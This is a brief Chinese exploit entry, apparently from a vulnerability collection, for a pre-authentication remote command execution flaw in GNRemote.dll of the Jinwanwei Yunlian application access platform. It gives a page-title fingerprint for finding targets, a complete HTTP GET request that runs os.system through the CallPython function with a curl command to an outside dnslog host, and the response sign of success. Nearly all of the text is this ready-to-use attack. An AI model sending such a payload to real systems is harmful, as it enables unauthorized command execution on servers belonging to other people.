# 金万维-云联应用系统接入平台GNRemote.dll前台RCE漏洞

金万维-云联应用系统接入平台GNRemote.dll前台 ｜ 命令执行 ｜ —
- **指纹**：`title="云联应用系统接入平台"`
- **请求**：`GET /GNRemote.dll?GNFunction=CallPython&pyFile=os&pyFunc=system&pyArgu=curl+xxx.dnslog.cn HTTP/1.1`
- **响应特征**：200 DNSLOG回显